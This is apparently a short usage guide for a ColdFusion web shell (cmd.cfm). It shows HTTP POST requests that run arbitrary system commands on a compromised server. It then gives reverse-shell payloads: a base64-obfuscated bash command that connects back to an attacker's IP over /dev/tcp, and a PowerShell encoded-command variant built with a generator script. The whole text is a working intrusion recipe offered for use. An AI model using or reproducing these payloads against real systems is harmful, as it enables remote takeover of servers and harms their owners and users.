How to use:

```
POST /path/cmd.cfm HTTP/1.1
Host: <your host>
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

cmd=ls&op=-la
```
`op` is the same arguments such as `ls -la`

or `cmd.exe /c dir` as: `cmd=cmd.exe&op=/c+dir`
![image](https://user-images.githubusercontent.com/24661746/131243971-d64831c2-3ba6-4df4-af26-bf6e60cdfd65.png)

Revershell for this case :
Linux:
```
POST /path/cmd.cfm HTTP/1.1
Host: <your host>
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

cmd=/bin/bash&op=-c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNC8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}
```
`YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNC8xMjM0IDA+JjE=` change base64 from `genRevershell.py` and encode as URL( Ctrl + U)

![image](https://user-images.githubusercontent.com/24661746/131244367-30cb021e-fc58-45fd-8f66-13d27e09ed6e.png)

For Windows:
```
POST /path/cmd.cfm HTTP/1.1
Host: <your host>
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

cmd=powershell&op=-EncodedCommand <output from `genRevershell.py`> and encode as URL( Ctrl + U)
```
![image](https://user-images.githubusercontent.com/24661746/131244608-87c38b49-1269-4616-a167-cd78da99d63f.png)
